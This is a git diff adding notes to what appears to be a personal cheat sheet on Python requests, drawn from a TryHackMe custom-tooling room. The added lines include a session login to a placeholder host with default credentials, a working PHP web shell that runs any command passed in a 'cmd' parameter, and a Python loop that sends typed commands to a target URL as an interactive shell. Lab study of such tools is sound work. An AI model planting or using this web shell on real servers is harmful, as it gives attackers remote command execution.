@@ -277,6 +277,47 @@ r.text
 r.headers
 r.encoding
 r.json
+
+# Create a session object to allow for session persistence to avoid manual redoing of tasks! 
+session = requests.Session()
+
+login_url = "http://badwebsite.com"
+credentials = 
+{"username": "admin", "password": "password123"}
+response = session.post(login_url, data=credentials)
+
+
+```
+
+With a simple php web shell make a shell builtin to your script - from [THM Custom Tooling Python](https://tryhackme.com/room/customtoolingpython)
+```php
+<?php
+if (!empty($_REQUEST['cmd'])) {
+    $cmd = $_REQUEST['cmd'];
+
+    // Execute the command and capture output
+    $output = shell_exec($cmd);
+
+    // Output the command result inside a styled pre block
+    echo $output;
+}
+?>
+``` 
+
+Add this to have a your exploit (after file transfer - example above is php) have shell builtin; also from [THM Custom Tooling Python](https://tryhackme.com/room/customtoolingpython)
+```python
+while True:
+    cmd = input("Shell> ")  
+    if cmd.lower() in ["exit", "quit"]:
+        break
+    
+    response = requests.get(TARGET_URL + cmd)
+    
+    if response.status_code == 200:
+        print(response.text)
+    else:
+        print("[-] Exploit failed")
+
 ```
 ### socket
 ```python
